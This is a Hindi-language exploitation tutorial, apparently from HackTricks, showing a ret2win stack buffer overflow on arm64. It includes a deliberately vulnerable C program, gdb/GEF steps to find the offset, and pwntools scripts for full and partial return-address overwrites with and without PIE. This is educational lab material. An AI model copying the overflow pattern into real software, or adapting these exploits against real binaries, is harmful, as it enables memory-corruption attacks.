# Ret2win - arm64

{{#include ../../../banners/hacktricks-training.md}}

arm64 का परिचय यहाँ खोजें:

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Code&#x20;
```c
#include <stdio.h>
#include <unistd.h>

void win() {
printf("Congratulations!\n");
}

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
पीआईई और कैनरी के बिना संकलित करें:
```bash
clang -o ret2win ret2win.c -fno-stack-protector -Wno-format-security -no-pie
```
## ऑफसेट खोजना

### पैटर्न विकल्प

यह उदाहरण [**GEF**](https://github.com/bata24/gef) का उपयोग करके बनाया गया था:

gef के साथ gdb शुरू करें, पैटर्न बनाएं और इसका उपयोग करें:
```bash
gdb -q ./ret2win
pattern create 200
run
```
<figure><img src="../../../images/image (1205).png" alt=""><figcaption></figcaption></figure>

arm64 x30 रजिस्टर में पते पर लौटने की कोशिश करेगा (जो कि समझौता किया गया था), हम इसका उपयोग पैटर्न ऑफसेट खोजने के लिए कर सकते हैं:
```bash
pattern search $x30
```
<figure><img src="../../../images/image (1206).png" alt=""><figcaption></figcaption></figure>

**ऑफसेट 72 है (9x48)।**

### स्टैक ऑफसेट विकल्प

स्टैक पते को प्राप्त करने से शुरू करें जहां pc रजिस्टर संग्रहीत है:
```bash
gdb -q ./ret2win
b *vulnerable_function + 0xc
run
info frame
```
<figure><img src="../../../images/image (1207).png" alt=""><figcaption></figcaption></figure>

अब `read()` के बाद एक ब्रेकपॉइंट सेट करें और तब तक जारी रखें जब तक `read()` निष्पादित न हो जाए और एक पैटर्न सेट करें जैसे 13371337:
```
b *vulnerable_function+28
c
```
<figure><img src="../../../images/image (1208).png" alt=""><figcaption></figcaption></figure>

इस पैटर्न को मेमोरी में कहाँ स्टोर किया गया है, इसे खोजें:

<figure><img src="../../../images/image (1209).png" alt=""><figcaption></figcaption></figure>

फिर: **`0xfffffffff148 - 0xfffffffff100 = 0x48 = 72`**

<figure><img src="../../../images/image (1210).png" alt="" width="339"><figcaption></figcaption></figure>

## No PIE

### नियमित

**`win`** फ़ंक्शन का पता प्राप्त करें:
```bash
objdump -d ret2win | grep win
ret2win:     file format elf64-littleaarch64
00000000004006c4 <win>:
```
शोषण:
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p64(0x00000000004006c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1211).png" alt="" width="375"><figcaption></figcaption></figure>

### Off-by-1

वास्तव में, यह स्टैक में संग्रहीत PC में ऑफ-बाय-2 के समान होगा। सभी रिटर्न पते को ओवरराइट करने के बजाय, हम **केवल अंतिम 2 बाइट्स** को `0x06c4` के साथ ओवरराइट करने जा रहे हैं।
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x06c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1212).png" alt="" width="375"><figcaption></figcaption></figure>

आप ARM64 में एक और off-by-one उदाहरण [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/) में पा सकते हैं, जो एक काल्पनिक भेद्यता में वास्तविक off-by-**one** है।

## With PIE

> [!TIP]
> बाइनरी को **`-no-pie` तर्क के बिना संकलित करें**

### Off-by-2

लीक के बिना हमें जीतने वाले फ़ंक्शन का सटीक पता नहीं पता है लेकिन हम बाइनरी से फ़ंक्शन का ऑफ़सेट जान सकते हैं और यह जानते हुए कि हम जो रिटर्न पता ओवरराइट कर रहे हैं वह पहले से ही एक निकटवर्ती पते की ओर इशारा कर रहा है, इस मामले में जीतने वाले फ़ंक्शन (**0x7d4**) के लिए ऑफ़सेट लीक करना संभव है और बस उस ऑफ़सेट का उपयोग करें:

<figure><img src="../../../images/image (1213).png" alt="" width="563"><figcaption></figcaption></figure>
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x07d4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
{{#include ../../../banners/hacktricks-training.md}}
